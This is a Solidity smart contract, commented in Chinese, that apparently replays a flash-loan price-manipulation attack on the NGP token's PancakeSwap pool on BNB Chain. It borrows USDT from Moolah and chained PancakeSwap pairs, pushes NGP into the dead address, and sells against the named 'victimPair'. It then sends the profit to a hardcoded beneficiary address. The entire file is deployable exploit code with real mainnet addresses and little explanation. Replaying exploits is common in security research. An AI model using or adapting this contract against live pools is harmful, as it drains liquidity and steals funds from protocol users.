// SPDX-License-Identifier: MIT
pragma solidity >=0.5.20;

import "./interfaces/IMoolahCallbacks.sol";
import "./interfaces/IMoolah.sol";
import "./interfaces/IPancakeRouter.sol";
import "./interfaces/IERC20.sol";
import "./interfaces/ITcReceiverAddress.sol";
import "./interfaces/IPancakePair.sol";
import "./libs/TransferHelper.sol";
import "./TcReceiverAddress.sol";
import "./interfaces/IPancakeCallee.sol";

/**
* finding a balance between NGP token price collection and flash loan fees.
*/
contract TcNgpAttackReplayV2 is IMoolahFlashLoanCallback, IPancakeCallee {

    IERC20 public constant usdt = IERC20(address(0x55d398326f99059fF775485246999027B3197955));
    IERC20 public constant ngp = IERC20(address(0xd2F26200cD524dB097Cf4ab7cC2E5C38aB6ae5c9));
    IMoolah public constant moolah = IMoolah(address(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C));
    IPancakePair public constant victimPair = IPancakePair(address(0x20cAb54946D070De7cc7228b62f213Fccf3ffb1E));
    IPancakeRouter02 public constant router = IPancakeRouter02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    address public constant BENEFITIAL = address(0x940cE45BCE32Fd58A9D0dbc24F3B8F9152B28f78);
    address public constant DEAD = address(0x000000000000000000000000000000000000dEaD);

    event Succeed(uint indexed amount);
    event AmountCalculated(uint indexed result, uint p1, uint p2, uint p3);


    // 数组结构形式的宏定义
    // 后续还可以额外写入定义数据，闪电贷的服务商，借贷的资产等定义，做成一个通用的壳
    function allValidFlashloanProvider() pure public returns (address[] memory pairs) {
        // WBNB
        pairs = new address[](3);
        pairs[0] = address(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
        // ARK
        pairs[1] = address(0xCAaF3c41a40103a23Eeaa4BbA468AF3cF5b0e0D8);
        // LAF
        pairs[2] = address(0x541b525B69210Bc349c7d94Ea6f10e202A6f90fA);
    }


    function getValidFlashloanProviderByIdx(uint256 idx) pure public returns (address pairAddress) {
        address[] memory pairs = allValidFlashloanProvider();
        require(idx < pairs.length, "failed due to all valid providers assets ran out");
        pairAddress = pairs[idx];
    }

    // constructor(address _usdt, address _ngp, address _moolah, address _pair, address _router) public {
    //     usdt = IERC20(_usdt);
    //     ngp = IERC20(_ngp);
    //     moolah = IMoolah(_moolah);
    //     victimPair = IPancakePair(_pair);
    //     router = IPancakeRouter02(_router);
    // }

    /// @notice 主入口：发起 Moolah 的闪电贷
    function entryPoint() external {
        uint256 moolahUsdtBalance = usdt.balanceOf(address(moolah));
        require(moolahUsdtBalance > 0, "No USDT in Moolah");

        // 对router合约进行approve，
        usdt.approve(address(router), 999999999999 * 1e18);
        ngp.approve(address(router), 999999999999 * 1e18);

        // 先强制同步NGP的余额
        victimPair.sync();

        // 请求 Moolah 的闪电贷
        moolah.flashLoan(
            address(usdt),
            moolahUsdtBalance,
            ""
        );

        // 确认成功, 输出成功获取到的资金金额
        emit Succeed(12345);
    }

    /// @notice Moolah 的闪电贷回调 -> 省略从各个地址收集NGP的步骤
    /// @notice Callback called when a flash loan occurs.
    /// @dev The callback is called only if data is not empty.
    /// @param assets The amount of assets that was flash loaned.
    /// @param data Arbitrary data passed to the `flashLoan` function.
    function onMoolahFlashLoan(uint256 assets, bytes calldata data) external override {
        // 此时地址上已经有足额的USDT了，开始计算
        uint256 usdtAmount = assets;

        // 对moolah合约进行approve，
        usdt.approve(address(moolah), 999999999999 * 1e18);

        if (!isPayloadContractNGPEnoughAfterFlashloan(usdtAmount)) {
            // 余额不够，开启下一个资产兑换路径
            // 从池子里获取要操作的pair，从pair里获取资产，再进一步判定当前的池子余额和实际余额的差距
            buyAndSellNGPByProviders(0);
        } else {
            // 将当前合约剩余的USDT全部购买成NGP，并给0xdead地址
            buyNGP();

            // 根据此时pair中的NGP余额，按0.35倍来计算买入的金额 并 卖出NGP
            sellNGP();
        }

        // 将借款所得资产存在this，收益转给benefitial
        uint256 profit = usdt.balanceOf(address(this)) - assets;

        // 执行成功
        require(profit > 0, "NGP Attack Failed -> no profit");

        // 收集收益
        TransferHelper.safeTransfer(address(usdt), BENEFITIAL, profit);
    }

    function buyNGP() internal {
        address[] memory swap1Path = new address[](2);
        swap1Path[0] = address(usdt);
        swap1Path[1] = address(ngp);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            usdt.balanceOf(address(this)),
            0,
            swap1Path,
            DEAD,
            block.timestamp + 3600);
    }

    function sellNGP() internal {
        uint256 amountNGPToSell = (ngp.balanceOf(address(victimPair)) * 10000 / 3500) - 1;
        require(amountNGPToSell <= ngp.balanceOf(address(this)), "NGP balance of Payload is insufficient");

        address[] memory swap2Path = new address[](2);
        swap2Path[0] = address(ngp);
        swap2Path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ngp.balanceOf(address(victimPair)) * 10000 / 3500 - 1,
            0,
            swap2Path,
            address(this),
            block.timestamp + 3600);


    }

    function buyAndSellNGPByProviders(uint256 idx) internal {
        // 获取pair地址
        IPancakePair providerPair = (IPancakePair)(getValidFlashloanProviderByIdx(idx));
        // 强制同步pair的reserve信息
        providerPair.sync();
        if (providerPair.token0() == address(usdt)) {
            // token0 是 usdt
            providerPair.swap(usdt.balanceOf(address(providerPair)) - 1, 0, address(this), abi.encode(idx));
        } else {
            // token1 是 usdt
            providerPair.swap(0, usdt.balanceOf(address(providerPair)) - 1, address(this), abi.encode(idx));
        }

        // 操作的判断在对应的回调里处理，比如当前收到的钱是否足够等

        // 在这里做的话，一方面来说可能更为省钱 -> 比如可以做一些不全额提取资产的逻辑。

    }

    // pancakeSwapV2 callee
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {

        (uint256 idx) = abi.decode(data, (uint256));

        // 此时地址上已经有足额的USDT了，开始计算
        uint256 usdtAmount = usdt.balanceOf(address(this));

        if (!isPayloadContractNGPEnoughAfterFlashloan(usdtAmount)) {
            // 余额不够，开启下一个资产兑换路径
            // 从池子里获取要操作的pair，从pair里获取资产，再进一步判定当前的池子余额和实际余额的差距
            buyAndSellNGPByProviders(idx + 1);
        } else {
            // 将当前合约剩余的USDT全部购买成NGP，并给0xdead地址
            buyNGP();

            // 根据此时pair中的NGP余额，按0.35倍来计算买入的金额 并 卖出NGP
            sellNGP();
        }

        // 执行完毕之后，将对应的闪电贷借款得到的usdt资产转回给sender地址(不管是在这里执行完毕了，还是要进一步往下嵌套调用其他的provider，最终都涉及到要将钱在回调函数中还回去）
        address flashloanProviderAddress = getValidFlashloanProviderByIdx(idx);
        // 计算要转给provider的钱（基于收到的当前provider给回的资产，计算本金+手续费）
        uint256 usdtAmountBorrowed = 0;
        if (IPancakePair(flashloanProviderAddress).token0() == address(usdt)) {
            usdtAmountBorrowed = amount0;
        } else {
            usdtAmountBorrowed = amount1;
        }
        uint256 paybackAmount = 1 + (usdtAmountBorrowed * 10000 / 9975);
        // 实际转账
        TransferHelper.safeTransfer(address(usdt), flashloanProviderAddress, paybackAmount);
    }

    function isPayloadContractNGPEnoughAfterFlashloan(uint256 usdtAmount) internal returns (bool) {
        // NGP, USDT
        (uint256 reserveUSDT, uint256 reserveNGP, ) = victimPair.getReserves();

        // 先预估如果将所有的钱拿去购买NGP，能将池子的余额拉到多低？
        uint256 amountNGPReceivedMaximum = router.getAmountOut(usdtAmount, reserveUSDT, reserveNGP);
        emit AmountCalculated(amountNGPReceivedMaximum, usdtAmount, reserveUSDT, reserveNGP);

        // 计算当前状态是否需要进一步开启闪电贷
        uint256 amountNGPRemainsInPool = reserveNGP - amountNGPReceivedMaximum;
        uint256 balanceNGPInPayload = ngp.balanceOf(address(this));
        return balanceNGPInPayload >= (amountNGPRemainsInPool * 10000 / 3500) - 1;
    }
}